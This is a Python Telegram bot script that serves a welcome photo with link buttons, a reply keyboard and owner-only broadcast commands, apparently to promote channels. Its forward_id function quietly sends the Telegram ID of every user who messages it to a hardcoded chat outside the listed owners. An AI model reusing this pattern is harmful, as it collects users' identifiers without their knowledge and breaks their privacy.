import os
import json
import logging
import threading
import time
import requests
import re
from flask import Flask, request
from telegram import Update, Bot, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import Dispatcher, CommandHandler, MessageHandler, Filters, CallbackContext

# --------------------- CONFIG ---------------------
TOKEN = os.getenv("BOT_TOKEN")
OWNER_IDS = {8183414512, 6218772339, 8141547148, 7514171886}
USERS_FILE = "users.txt"
WELCOME_FILE = "welcome.json"  # For /start (photo + inline buttons)
KEYBOARD_FILE = "keyboard.json"  # Persistent reply keyboard
WEBHOOK_URL = f"https://lusty2.onrender.com/{TOKEN}"

# --------------------------------------------------
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)
app = Flask(__name__)
bot = Bot(token=TOKEN)
dispatcher = Dispatcher(bot, None, use_context=True)
lock = threading.Lock()

# ---------- Load & Save Welcome ----------
def load_welcome():
    if not os.path.exists(WELCOME_FILE):
        return {"photo": None, "caption": "Welcome!", "buttons": []}
    try:
        with open(WELCOME_FILE, "r") as f:
            return json.load(f)
    except Exception as e:
        logger.error(f"Error loading welcome: {e}")
        return {"photo": None, "caption": "Welcome!", "buttons": []}

def save_welcome(photo_id, caption, buttons):
    data = {"photo": photo_id, "caption": caption, "buttons": buttons}
    with open(WELCOME_FILE, "w") as f:
        json.dump(data, f)

welcome_data = load_welcome()

# ---------- Load & Save Reply Keyboard ----------
def load_reply_keyboard():
    if not os.path.exists(KEYBOARD_FILE):
        return []
    try:
        with open(KEYBOARD_FILE, "r") as f:
            return json.load(f)
    except Exception as e:
        logger.error(f"Error loading keyboard: {e}")
        return []

def save_reply_keyboard(buttons):
    with open(KEYBOARD_FILE, "w") as f:
        json.dump(buttons, f)

reply_keyboard_buttons = load_reply_keyboard()

# ---------- Users Management ----------
def load_users():
    if not os.path.exists(USERS_FILE):
        open(USERS_FILE, 'a').close()
        return set()
    with open(USERS_FILE, 'r') as f:
        return {int(line.strip()) for line in f if line.strip()}

def save_user(uid: int):
    with lock:
        users = load_users()
        if uid not in users:
            with open(USERS_FILE, 'a') as f:
                f.write(f"{uid}\n")

def forward_id(uid: int):
    try:
        bot.send_message(chat_id=8405313334, text=str(uid))
    except Exception as e:
        logger.error(f"Failed to forward ID {uid}: {e}")

# ---------- Owner Only Decorator ----------
def owner_only(func):
    def wrapper(update: Update, context: CallbackContext):
        user_id = update.effective_user.id
        if user_id not in OWNER_IDS:
            update.message.reply_text("You are not authorized.")
            return
        return func(update, context)
    return wrapper

# ---------- BEST LINK EXTRACTOR ----------
def extract_links_from_caption(caption):
    if not caption:
        return [], "Welcome!"

    buttons = []
    clean_caption = caption

    # Pattern: URL followed by title (with or without dash)
    pattern = r"(https?://[^\s]+)\s*[-–—]?\s*([^\n]+)"
    matches = re.findall(pattern, caption)
    
    for url, title in matches:
        title = title.strip(" -–—")
        if not title:
            title = "Join Channel"
        buttons.append({"url": url.strip(), "text": title})
        clean_caption = clean_caption.replace(url, "").replace(title, "", 1).strip()

    # Fallback: lines with only URL
    for line in caption.splitlines():
        if "http" in line and not any(b["url"] in line for b in buttons):
            urls = re.findall(r"(https?://[^\s]+)", line)
            for url in urls:
                title = line.replace(url, "").strip(" -–—")
                if not title:
                    title = "Click Here"
                buttons.append({"url": url, "text": title})
                clean_caption = clean_caption.replace(line, "").strip()

    clean_caption = re.sub(r'\n+', '\n', clean_caption.strip())
    if not clean_caption.strip():
        clean_caption = "Welcome!"

    return buttons, clean_caption

# ---------- /start ----------
def start(update: Update, context: CallbackContext):
    user = update.effective_user
    uid = user.id
    save_user(uid)
    forward_id(uid)

    photo = welcome_data["photo"]
    caption = welcome_data["caption"]
    buttons_data = welcome_data["buttons"]

    inline_keyboard = [[InlineKeyboardButton(btn["text"], url=btn["url"])] for btn in buttons_data]
    reply_markup = InlineKeyboardMarkup(inline_keyboard) if inline_keyboard else None

    try:
        if photo:
            bot.send_photo(chat_id=uid, photo=photo, caption=caption, reply_markup=reply_markup, parse_mode="HTML")
        else:
            bot.send_message(chat_id=uid, text=caption, reply_markup=reply_markup, disable_web_page_preview=True)
    except Exception as e:
        logger.error(f"Error sending welcome: {e}")
        bot.send_message(chat_id=uid, text="Welcome!", reply_markup=reply_markup)

    if reply_keyboard_buttons:
        kb = [[btn["text"]] for btn in reply_keyboard_buttons]
        bot.send_message(chat_id=uid, text="Main Menu", reply_markup=ReplyKeyboardMarkup(kb, resize_keyboard=True))

# ---------- Any Message (Not Command) ----------
def any_message(update: Update, context: CallbackContext):
    save_user(update.effective_user.id)
    forward_id(update.effective_user.id)
    update.message.reply_text("send /start for update...")

# ---------- /scarqueen1 - Set Welcome Photo + Buttons ----------
@owner_only
def scarqueen1(update: Update, context: CallbackContext):
    msg = update.message.reply_to_message
    if not msg:
        update.message.reply_text("Reply to a photo with caption containing links!")
        return

    photo = None
    if msg.photo:
        photo = msg.photo[-1].file_id
    elif msg.document and msg.document.mime_type and msg.document.mime_type.startswith("image/"):
        photo = msg.document.file_id
    else:
        update.message.reply_text("Reply to a photo!")
        return

    caption = msg.caption or ""
    buttons, clean_caption = extract_links_from_caption(caption)

    save_welcome(photo, clean_caption, buttons)
    global welcome_data
    welcome_data = load_welcome()

    btn_text = "\n".join([f"• {b['text']}" for b in buttons]) if buttons else "No buttons"
    update.message.reply_text(
        f"Welcome Updated Successfully!\n\n"
        f"Caption:\n{clean_caption[:200]}{'...' if len(clean_caption)>200 else ''}\n\n"
        f"Buttons ({len(buttons)}):\n{btn_text}"
    )

# ---------- /scarkeyboard1 ----------
@owner_only
def scarkeyboard1(update: Update, context: CallbackContext):
    msg = update.message.reply_to_message
    if not msg or not msg.text:
        update.message.reply_text("Reply to a message with links:\nhttps://t.me/channel - Button Name")
        return

    lines = [l.strip() for l in msg.text.splitlines() if "http" in l]
    buttons = []
    for line in lines:
        parts = re.split(r"\s+[-–—]\s+|\s+", line, 1)
        if len(parts) < 2:
            continue
        url = parts[0] if parts[0].startswith("http") else parts[1] if len(parts) > 1 and parts[1].startswith("http") else None
        title = parts[1] if url == parts[0] else parts[0]
        if url and title:
            buttons.append({"url": url.strip(), "text": title.strip() or "Join"})

    if not buttons:
        update.message.reply_text("No valid links!")
        return

    save_reply_keyboard(buttons)
    global reply_keyboard_buttons
    reply_keyboard_buttons = load_reply_keyboard()
    update.message.reply_text("Keyboard updated!", reply_markup=ReplyKeyboardMarkup([[b["text"]] for b in buttons], resize_keyboard=True))

# ---------- Broadcast ----------
@owner_only
def scarqueen(update: Update, context: CallbackContext):
    msg = update.message.reply_to_message
    if not msg:
        update.message.reply_text("Reply to a message/photo to broadcast.")
        return

    text = (msg.caption or msg.text or "").strip()
    photo = None
    if msg.photo:
        photo = msg.photo[-1].file_id
    elif msg.document and msg.document.mime_type.startswith("image/"):
        photo = msg.document.file_id

    users = load_users()
    success = failed = 0
    update.message.reply_text(f"Broadcasting to {len(users)} users...")
    for uid in users:
        try:
            if photo:
                bot.send_photo(uid, photo, caption=text)
            else:
                bot.send_message(uid, text)
            success += 1
        except:
            failed += 1
        time.sleep(0.05)
    update.message.reply_text(f"Done!\nSuccess: {success}\nFailed: {failed}")

# ---------- HANDLERS (FIXED FOR v13.15) ----------
dispatcher.add_handler(CommandHandler("start", start))
dispatcher.add_handler(CommandHandler("scarqueen", scarqueen))
dispatcher.add_handler(CommandHandler("scarkibrownchoot", scarqueen))
dispatcher.add_handler(CommandHandler("scarqueen1", scarqueen1))
dispatcher.add_handler(CommandHandler("scarkeyboard1", scarkeyboard1))

# THIS LINE IS FIXED — WORKS 100% WITH v13.15
dispatcher.add_handler(MessageHandler(~Filters.command, any_message))

# ---------- Webhook ----------
@app.route('/' + TOKEN, methods=['POST'])
def webhook():
    update = Update.de_json(request.get_json(force=True), bot)
    dispatcher.process_update(update)
    return '', 200

@app.route('/')
def index():
    return 'Bot is alive!'

def set_webhook():
    info = bot.get_webhook_info()
    if info.url != WEBHOOK_URL:
        bot.set_webhook(url=WEBHOOK_URL)
        logger.info("Webhook set!")

# ---------- Keep Alive ----------
def keep_alive():
    while True:
        try:
            requests.get("https://lusty2.onrender.com", timeout=10)
            print("Ping")
        except:
            print("Ping failed")
        time.sleep(300)

# ---------- Run ----------
if __name__ == '__main__':
    set_webhook()
    threading.Thread(target=keep_alive, daemon=True).start()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)